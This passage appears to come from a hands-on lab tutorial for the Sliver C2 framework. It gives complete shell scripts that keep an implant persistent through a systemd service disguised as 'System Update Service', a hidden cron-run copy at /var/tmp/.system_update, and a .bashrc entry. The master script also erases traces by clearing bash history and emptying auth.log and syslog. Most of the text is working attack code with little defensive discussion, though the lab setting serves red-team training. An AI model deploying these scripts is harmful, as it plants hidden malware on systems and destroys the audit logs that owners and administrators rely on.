Task 4: Automation Scripts for Persistence
Subtask 4.1: Create Systemd Service Persistence
Create a systemd service file for persistence:
cat > ~/sliver-lab/sliver-agent.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/opt/sliver-agent/agent
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
Create the installation script:
cat > ~/sliver-lab/install_persistence.sh << 'EOF'
#!/bin/bash

# Create service directory
sudo mkdir -p /opt/sliver-agent

# Copy implant to service directory
sudo cp /tmp/PROPER_SNAKE /opt/sliver-agent/agent
sudo chmod +x /opt/sliver-agent/agent

# Install systemd service
sudo cp ~/sliver-lab/sliver-agent.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable sliver-agent.service

echo "Persistence installed successfully"
echo "Service will start on next boot"
EOF
Make the script executable:
chmod +x ~/sliver-lab/install_persistence.sh
Subtask 4.2: Create Cron-based Persistence
Create a cron-based persistence script:
cat > ~/sliver-lab/cron_persistence.sh << 'EOF'
#!/bin/bash

IMPLANT_PATH="/tmp/PROPER_SNAKE"
BACKUP_PATH="/var/tmp/.system_update"

# Create backup location
sudo cp $IMPLANT_PATH $BACKUP_PATH
sudo chmod +x $BACKUP_PATH

# Add cron job for persistence
(crontab -l 2>/dev/null; echo "*/15 * * * * $BACKUP_PATH >/dev/null 2>&1") | crontab -

echo "Cron persistence installed"
echo "Implant will execute every 15 minutes"
EOF
Make the script executable:
chmod +x ~/sliver-lab/cron_persistence.sh
Subtask 4.3: Create Comprehensive Automation Script
Create a master automation script that combines multiple persistence methods:
cat > ~/sliver-lab/master_automation.sh << 'EOF'
#!/bin/bash

# Sliver C2 Automation Script
# This script automates implant deployment and persistence

set -e

SLIVER_SERVER="localhost:8080"
IMPLANT_NAME="stealth_agent"
LOG_FILE="/tmp/sliver_automation.log"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a $LOG_FILE
}

check_sliver_server() {
    log_message "Checking Sliver server connectivity..."
    if ! curl -s http://$SLIVER_SERVER >/dev/null 2>&1; then
        log_message "ERROR: Cannot connect to Sliver server"
        return 1
    fi
    log_message "Sliver server is accessible"
    return 0
}

deploy_implant() {
    log_message "Deploying implant..."
    
    # Check if implant exists
    if [ ! -f "/tmp/$IMPLANT_NAME" ]; then
        log_message "ERROR: Implant not found at /tmp/$IMPLANT_NAME"
        return 1
    fi
    
    # Execute implant in background
    nohup /tmp/$IMPLANT_NAME >/dev/null 2>&1 &
    IMPLANT_PID=$!
    
    log_message "Implant deployed with PID: $IMPLANT_PID"
    echo $IMPLANT_PID > /tmp/sliver_implant.pid
    
    return 0
}

setup_persistence() {
    log_message "Setting up persistence mechanisms..."
    
    # Method 1: Systemd service
    if command -v systemctl >/dev/null 2>&1; then
        log_message "Installing systemd persistence..."
        bash ~/sliver-lab/install_persistence.sh
    fi
    
    # Method 2: Cron job
    if command -v crontab >/dev/null 2>&1; then
        log_message "Installing cron persistence..."
        bash ~/sliver-lab/cron_persistence.sh
    fi
    
    # Method 3: Profile persistence
    echo "nohup /tmp/$IMPLANT_NAME >/dev/null 2>&1 &" >> ~/.bashrc
    
    log_message "Persistence mechanisms installed"
}

cleanup_traces() {
    log_message "Cleaning up traces..."
    
    # Clear bash history
    history -c
    
    # Remove temporary files
    rm -f /tmp/sliver_*.tmp
    
    # Clear system logs (if running as root)
    if [ "$EUID" -eq 0 ]; then
        > /var/log/auth.log
        > /var/log/syslog
    fi
    
    log_message "Cleanup completed"
}

main() {
    log_message "Starting Sliver C2 automation..."
    
    if check_sliver_server; then
        deploy_implant
        setup_persistence
        cleanup_traces
        log_message "Automation completed successfully"
    else
        log_message "Automation failed - server not accessible"
        exit 1
    fi
}

# Execute main function
main "$@"
EOF
Make the master script executable:
